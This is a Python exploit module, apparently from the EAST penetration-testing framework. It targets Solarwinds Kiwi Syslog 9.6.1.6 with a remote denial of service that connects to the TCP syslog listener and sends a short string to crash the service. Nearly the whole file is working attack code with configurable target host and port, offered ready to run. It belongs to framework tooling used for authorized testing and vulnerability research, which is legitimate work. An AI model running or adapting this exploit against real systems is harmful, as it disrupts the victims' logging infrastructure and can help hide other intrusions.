#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import os
import struct
import socket

sys.path.append('./core')
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_solarwinds_kiwi_syslog_dos"
INFO['DESCRIPTION'] = "Solarwinds Kiwi Syslog 9.6.1.6 - Denial of Service"
INFO['VENDOR'] = "http://www.solarwinds.com/"
INFO['DOWNLOAD_LINK'] = 'http://downloads.solarwinds.com/solarwinds/Release/Kiwi/Syslog/Kiwi-Syslog-Server-9.6.1-Eval.zip'
INFO['LINKS'] = ['https://www.exploit-db.com/exploits/42411/']
INFO["CVE Name"] = ""
INFO["NOTES"] = """A remote Denial of Service exists in Kiwi Syslog 9.6.1.6 in the TCP listener. Apparently any data sent to it make it crash because of a Type Mismatch error. The syslog TCP listener is disabled by default.
"""
INFO['CHANGELOG'] = "02 Aug, 2017. Written by Gleg team."
INFO['PATH'] = 'Exploits/General/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["HOST"] = "127.0.0.1", dict(description = 'Target IP')
OPTIONS["PORT"] = 1468, dict(description = 'Target port')


class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.port = port
        self.host = host
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        
    def run(self):
        self.args()
        self.log("Attacking {}".format(self.host))
        
        s = socket.socket()
        try:
            self.log('[*] Connecting ...')
            s.connect((self.host, self.port))
            self.log('[*] Sending ...')
            s.send('EaST crash you?')
            s.close()
        except Exception as e:
            self.log(e)
            self.finish(False)
            
        self.log('[+] Done!')
        self.finish(True)

if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """

    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
